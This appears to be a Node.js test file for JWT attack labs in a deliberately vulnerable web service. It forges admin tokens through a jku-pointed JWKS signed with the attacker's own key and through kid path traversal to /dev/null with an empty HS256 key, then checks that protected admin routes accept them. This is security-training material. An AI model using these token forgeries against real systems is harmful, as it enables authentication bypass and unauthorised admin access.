require('dotenv').config();
const assert = require('assert');
const crypto = require('crypto');
const http = require('http');
const jwt = require('jsonwebtoken');
const request = require('supertest')(require('./helpers/base-url'));

describe('JWT key handling labs', function () {
  let jwksServer;
  let jwksUrl;
  let privateKey;
  let publicJwk;

  before(function (done) {
    const pair = crypto.generateKeyPairSync('rsa', { modulusLength: 2048 });
    privateKey = pair.privateKey;
    publicJwk = { ...pair.publicKey.export({ format: 'jwk' }), kid: 'test-key', use: 'sig', alg: 'RS256' };
    jwksServer = http.createServer((req, res) => {
      res.setHeader('Content-Type', 'application/json');
      res.end(JSON.stringify({ keys: [publicJwk] }));
    });

    // In Compose the app and test runner are separate containers on the same
    // network; in local runs both processes can reach the host loopback.
    const host = process.env.DVWS_BASE_URL?.includes('://web-test') ? '0.0.0.0' : '127.0.0.1';
    jwksServer.listen(0, host, () => {
      const address = jwksServer.address();
      const jwksHost = host === '0.0.0.0' ? 'test-runner' : '127.0.0.1';
      jwksUrl = `http://${jwksHost}:${address.port}/jwks`;
      done();
    });
  });

  after(function (done) {
    if (!jwksServer?.listening) return done();
    jwksServer.close(done);
  });

  it('accepts an attacker-signed RS256 token through shared auth and reaches a protected app route', async function () {
    const token = jwt.sign({ user: 'admin', permissions: ['user:admin'] }, privateKey, {
      algorithm: 'RS256',
      issuer: 'https://github.com/snoopysecurity',
      header: { jku: jwksUrl, kid: 'test-key' }
    });
    const response = await request.get('/api/v2/admin/logs')
      .set('Authorization', `Bearer ${token}`);

    assert.strictEqual(response.status, 200);
    assert.strictEqual(response.headers['content-type'].startsWith('text/plain'), true);
  });

  it('accepts an HS256 token after kid traverses to /dev/null', async function () {
    const token = jwt.sign({ sub: 'admin@dvws.local' }, Buffer.from([0]), {
      algorithm: 'HS256',
      header: { kid: '../../../../../../dev/null' }
    });
    const response = await request.get('/api/v2/jwt-key-lab/kid/profile')
      .set('Authorization', `Bearer ${token}`);

    assert.strictEqual(response.status, 200);
    assert.strictEqual(response.body.profile.email, 'admin@dvws.local');
    assert.strictEqual(response.body.authenticatedAs, 'admin@dvws.local');
  });

  it('uses kid traversal to forge a token accepted by a protected application endpoint', async function () {
    const token = jwt.sign({ user: 'admin', permissions: ['user:admin'] }, Buffer.from([0]), {
      algorithm: 'HS256',
      header: { kid: '../../../../../../dev/null' }
    });
    const response = await request.get('/api/v2/admin/logs')
      .set('Authorization', `Bearer ${token}`);

    assert.strictEqual(response.status, 200);
    assert.strictEqual(response.headers['content-type'].startsWith('text/plain'), true);
  });
});
